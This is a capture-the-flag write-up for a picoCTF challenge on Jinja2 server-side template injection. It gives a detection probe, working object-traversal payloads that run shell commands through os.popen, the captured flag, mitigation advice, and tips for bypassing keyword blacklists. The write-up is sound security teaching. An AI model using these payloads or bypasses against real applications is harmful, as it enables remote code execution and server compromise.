# Challenge Description
The challenge provides a web application with an input field. The server takes the user-supplied input and renders it back to the page. This behavior suggests the input is being processed by a server-side template engine (like Jinja2, Twig, or Mako).

The core vulnerability, SSTI, occurs when an application insecurely embeds user-controlled input into a template, rather than passing it as data to be rendered. This allows the user to inject template syntax, which the server then executes. Our goal is to first confirm this vulnerability and then escalate it to Remote Code Execution (RCE) to read the flag from the server's file system.

## Solution
The attack proceeds in three phases: detection, enumeration, and exploitation.

1. Detection: Probing for SSTI
First, we must determine if the server is vulnerable by checking how it handles template syntax.

Test 1: Normal Input

Input: Error

Response: Error

Observation: The server reflects our non-malicious input as expected.

Test 2: SSTI Probe

Input: {{7*7}}

Response: 49

Observation: The server did not reflect the literal string {{7*7}}. It evaluated the expression as template code. This is a definitive confirmation of an SSTI vulnerability. The {{ ... }} syntax strongly suggests a Python-based engine like Jinja2.

2. Exploitation: Achieving Remote Code Execution (RCE)
Now that we have a code execution primitive, we must "escape" the template's restricted sandbox to access powerful, dangerous modules (like os in Python) to run shell commands.

The provided payload is a well-known object traversal chain for Jinja2: {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read() }}

Payload Deconstruction: This payload "walks" the Python object inheritance tree to find the os module:

self: A reference to the current template object.

_TemplateReference__context: Accesses the template's context.

cycler...__init__: Finds a function within the context.

__globals__: Accesses the function's global variables, which contains all loaded Python modules, including os.

os.popen('ls').read(): Accesses the os module, calls popen() to execute the ls command, and uses read() to return its output.

3. Flag Retrieval
We send the payloads to the server via the input field.

Command 1: List Files

Payload: {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read() }}

Response: (The server's response would list files, e.g., index.py flag.txt)

Observation: We confirm a file named flag or flag.txt exists.

Command 2: Read Flag

Payload: {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read() }}

Response: picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bdc95c1a}

Observation: The server executes the cat flag command and returns its output, which is the flag.

## Flag

```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bdc95c1a}
```

## Concepts Learnt
Server-Side Template Injection (SSTI): This is the core vulnerability. It occurs when applications insecurely concatenate user input into a template string instead of passing it as data.

Vulnerable: template = "Hello, " + user_input

Safe: template.render(username=user_input) This distinction is critical: in the "Safe" version, the engine treats user_input as plain text. In the "Vulnerable" version, the engine parses user_input as part of the template code.

Vulnerability Detection: The {{7*7}} payload is a simple "polyglot" probe. Different engines use different syntax (e.g., ${7*7}, <%= 7*7 %>). By sending a mathematical operation, we can distinguish between simple reflection (output: {{7*7}}) and code evaluation (output: 49).

Python Object Traversal ("Sandbox Escape"): The exploit payload is a powerful example of RCE. Since the template engine itself is written in Python, its objects and functions exist in the same memory space as the rest of the application. By using Python's "magic methods" like __globals__, __mro__ (Method Resolution Order), and __subclasses__, an attacker can "walk" the object tree to find and call dangerous functions.

Remote Code Execution (RCE): This is the impact of the SSTI. The attacker gains the ability to execute arbitrary commands on the server with the same permissions as the web application. This is one of the most critical vulnerabilities, as it leads to full server compromise.

## Notes
Payload Specificity: The payload {{ self._TemplateReference__context... }} is extremely specific to certain versions of Jinja2 and the application's context. In a real-world scenario, an attacker would enumerate many different payloads (e.g., trying to access {{ config }} or using {{ [].__class__.__base__.__subclasses__() }}) to find one that works.

Automation: Tools like Tplmap are built to automate this entire process. They can detect the template engine, fingerprint the version, and provide a list of working RCE payloads.

Mitigation (The Only Real Fix): The only robust defense against SSTI is to never use user-controlled input to build the template string itself. Always pass user input as data to the template rendering function.

Failed Defenses (Blacklisting): A common but ineffective defense is to blacklist keywords like os, popen, or globals. These are trivial to bypass using string concatenation ('pop' + 'en'), hex encoding, or by finding other, less-obvious-but-still-dangerous modules.

## Resources
1. https://portswigger.net/web-security/server-side-template-injection

2. https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

3. https://owasp.org/www-project-top-ten/2017/A1_2017-Injection

4. httpshttps://github.com/epinna/tplmap
